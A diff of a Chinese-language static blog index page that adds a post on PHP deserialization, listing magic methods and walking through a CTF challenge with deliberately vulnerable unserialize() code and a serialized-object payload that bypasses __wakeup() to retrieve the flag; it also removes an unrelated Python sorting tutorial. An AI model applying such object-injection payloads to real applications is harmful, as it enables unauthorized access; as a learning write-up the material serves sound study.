@@ -205,6 +205,97 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="记录学习路上的一些东西">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/" class="post-title-link" itemprop="url">序列化与发序列化 绕过__weakup()</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">نُشر في</span>
+              
+
+              <time title="أُنشأ: 2022-01-19 15:01:42 / عُدل: 15:03:05" itemprop="dateCreated datePublished" datetime="2022-01-19T15:01:42+08:00">2022-01-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">في</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Experience/" itemprop="url" rel="index"><span itemprop="name">-Experience</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="序列化与发序列化"><a href="#序列化与发序列化" class="headerlink" title="序列化与发序列化"></a>序列化与发序列化</h1><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-1前置知识"><a href="#1-1前置知识" class="headerlink" title="1.1前置知识"></a>1.1前置知识</h2><p>反序列化的对象是类与对象</p>
+<h3 id="1-1-1常用的一些魔术方法"><a href="#1-1-1常用的一些魔术方法" class="headerlink" title="1.1.1常用的一些魔术方法"></a>1.1.1常用的一些魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct()//创建对象的时候使用</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-1-2相关函数"><a href="#1-1-2相关函数" class="headerlink" title="1.1.2相关函数"></a>1.1.2相关函数</h3><p><code>unserialize()</code>将传入字符串反序列化。</p>
+<p><code>serialize()</code>将传入变量序列化。</p>
+<p>与之类似于还有:<code>json_encode</code>和<code>json_decode</code></p>
+<h3 id="1-1-3序列化与反序列化"><a href="#1-1-3序列化与反序列化" class="headerlink" title="1.1.3序列化与反序列化"></a>1.1.3序列化与反序列化</h3><p>序列化是将任意类型的变量以特定的规则转换成一串字符串，可以用更少的空间保存对象里的信息，便于传输；反序列化则是根据规则还原字符串所对应的变量；</p>
+<p>如果变量类型是<code>protected</code>，则会在变量名前加上<code>%00*%00</code>,<code>private</code>则会在变量名前加上<code>%00类名%00</code>（这里不可见字符要用url编码表示）</p>
+<h3 id="1-1-4格式"><a href="#1-1-4格式" class="headerlink" title="1.1.4格式"></a>1.1.4格式</h3><p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132735454.png" alt="image-20220119132735454"></p>
+<p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132752202.png" alt="image-20220119132752202"></p>
+<h1 id="2-常见的绕过"><a href="#2-常见的绕过" class="headerlink" title="2.常见的绕过"></a>2.常见的绕过</h1><p>[(33条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=4.16.0">CTF]PHP反序列化总结_Y4tacker的博客-CSDN博客_php反序列化</a></p>
+<h1 id="3-找点题"><a href="#3-找点题" class="headerlink" title="3.找点题"></a>3.找点题</h1><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>访问<a target="_blank" rel="noopener" href="http://www.zip拿到源码/">www.zip拿到源码</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//class.php</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">  <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">   <span class="comment">//index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>index.php ，会调用class.php，以及对输入反序列化</p>
+<p>然后因为要绕过wakeup,把Name后的数字改成3.因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00</p>
+<p>最后payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交得到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1514,117 +1605,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/05/%E4%B8%80%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9A%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95-sort-sorted/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="记录学习路上的一些东西">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/05/%E4%B8%80%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9A%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95-sort-sorted/" class="post-title-link" itemprop="url">一、拓展py：方法和函数拓展 sort sorted</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">نُشر في</span>
-              
-
-              <time title="أُنشأ: 2022-01-05 16:47:33 / عُدل: 16:51:41" itemprop="dateCreated datePublished" datetime="2022-01-05T16:47:33+08:00">2022-01-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">في</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">-python</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="python方法和函数拓展-sort-sorted"><a href="#python方法和函数拓展-sort-sorted" class="headerlink" title="python方法和函数拓展 sort sorted"></a>python方法和函数拓展 sort sorted</h1><h2 id="1-sort-与-sorted的区别"><a href="#1-sort-与-sorted的区别" class="headerlink" title="1.sort 与 sorted的区别"></a>1.sort 与 sorted的区别</h2><p>sort是对列表本身进行永久性的排序。</p>
-<p>sorted则会返回一个排序之后的列表，不会对列表本身进行修改。</p>
-<p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">list</span>.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">new_list = <span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(new_list)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2-sort"><a href="#2-sort" class="headerlink" title="2.sort"></a>2.sort</h2><h3 id="2-1参数"><a href="#2-1参数" class="headerlink" title="2.1参数"></a>2.1参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>.sort(cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
-<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
-<li>reverse – 排序规则，<strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</li>
-</ul>
-<h3 id="2-2key参数的应用"><a href="#2-2key参数的应用" class="headerlink" title="2.2key参数的应用"></a>2.2key参数的应用</h3><p>根据列表中指定的元素进行排序</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义一个取第二个元素的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">takesecond</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">return</span> item[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#循环列表中的每一个元素，并且根据元素中的第二个元素进行排序。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=takesecond)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，参数x，返回x中的第二个元素</span></span><br><span class="line"><span class="comment">#key 指定了根据x的第二个元素进行排序</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
-
-<p>key会把列表的元素作为参数传入后面的函数，然后把函数的返回值作为排序的依据。</p>
-<h4 id="2-2-1扩展"><a href="#2-2-1扩展" class="headerlink" title="2.2.1扩展"></a>2.2.1扩展</h4><p>如果key接受了两个返回值，那么第一个返回值就会是首要排序依据，如果第一个返回值相等，那么会根据第二个返回值进行排序。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，返回第一个元素和第二个元素</span></span><br><span class="line"><span class="comment">#key就会让x[1]成为首要排序依据，另一个成为次要依据</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [31, 2], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-3reverse参数的应用"><a href="#2-3reverse参数的应用" class="headerlink" title="2.3reverse参数的应用"></a>2.3reverse参数的应用</h3><p><strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#设置为降序，从大到小。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]),reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[1, 3], [32, 2], [31, 2], [12, 1]]</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-sorted"><a href="#3-sorted" class="headerlink" title="3.sorted"></a>3.sorted</h2><h3 id="3-1参数"><a href="#3-1参数" class="headerlink" title="3.1参数"></a>3.1参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sorted</span>(iterable, cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>iterable – 可迭代对象。</li>
-<li>cmp – 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。</li>
-<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
-<li>reverse – 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。</li>
-</ul>
-<h3 id="3-2对key参数的应用"><a href="#3-2对key参数的应用" class="headerlink" title="3.2对key参数的应用"></a>3.2对key参数的应用</h3><p>按value值对字典排序</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">3</span>,<span class="string">&quot;b&quot;</span>:<span class="number">1</span>,<span class="string">&quot;c&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">#指定迭代对象是字典中的每一个键值对</span></span><br><span class="line"><span class="comment">#将键值对作为参数传入匿名函数，返回值，将value作为排序的标准</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(d.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#[(&#x27;b&#x27;, 1), (&#x27;c&#x27;, 2), (&#x27;a&#x27;, 3)]</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3对cmp参数的使用（效率key-gt-cmp）"><a href="#3-3对cmp参数的使用（效率key-gt-cmp）" class="headerlink" title="3.3对cmp参数的使用（效率key&gt;cmp）"></a>3.3对cmp参数的使用（效率key&gt;cmp）</h3><p>发现在py3中取消了cmp参数，那就不写啦！</p>
-<h3 id="3-4reverse"><a href="#3-4reverse" class="headerlink" title="3.4reverse"></a>3.4reverse</h3><p>和上面的一样的</p>
-<h2 id="4-应用扩展"><a href="#4-应用扩展" class="headerlink" title="4.应用扩展"></a>4.应用扩展</h2><p>输入名字（英文），名字在前面形式在后面中间用空格分离，要求根据姓氏排序，姓氏首字母一样就用名字排序，然后输出一个列表，每一个元素装一个名字。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sName=<span class="built_in">input</span>(<span class="string">&quot;输入名字，名前后姓，quit退出&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> sName!=<span class="string">&quot;quit&quot;</span>:</span><br><span class="line">    a.append(sName)</span><br><span class="line">    sName=<span class="built_in">input</span>() <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line"><span class="comment"># 把名字和姓氏组成一个列表嵌套进一个列表中</span></span><br><span class="line">Allname=[x.split() <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="comment">#排序</span></span><br><span class="line">Allname.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line">final=[]</span><br><span class="line"><span class="comment">#把嵌套的列表转换回来</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Allname)):</span><br><span class="line">    final.append(<span class="string">&quot; &quot;</span>.join(y <span class="keyword">for</span> y <span class="keyword">in</span> Allname[x]))</span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1696,7 +1676,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">المقالات</span>
         </a>
       </div>
